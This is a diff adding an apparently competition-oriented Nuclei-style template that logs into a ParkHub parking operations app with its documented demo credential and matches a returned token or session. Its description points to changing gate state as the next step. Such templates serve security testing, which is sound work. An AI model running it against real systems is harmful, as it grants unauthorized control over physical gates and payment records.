@@ -1,0 +1,48 @@
+# ParkHub parking ops default credential probe.
+id: parkhub-default-creds
+
+info:
+  name: ParkHub Parking Operations Default Credentials
+  author: cptc-toolkit
+  severity: high
+  metadata:
+    max-request: 1
+    kind: attack
+  description: |
+    ParkHub-style parking operations apps (the Rust/PHP pair) ship demo
+    credentials in their seed data (admin@parkhub.test / documented demo
+    password). Parking ops control the lot gates and payment capture.
+
+    This template POSTs the demo credential to the login endpoint and
+    matches the authenticated dashboard. A match means parking operations
+    access: gate events, payment records and pass issuance. Gate state
+    change endpoints are the immediate next step within scope.
+
+    One POST request. The credential is a documented demo default.
+  reference:
+    - https://github.com/nash87/parkhub-rust
+  tags: parking,parkhub,default-login,attack
+
+http:
+  - raw:
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"email":"admin@parkhub.test","password":"password"}
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"token"'
+          - "session"
+        condition: or
+      - type: dsl
+        dsl:
+          - "contains(to_lower(content_type), 'json')"
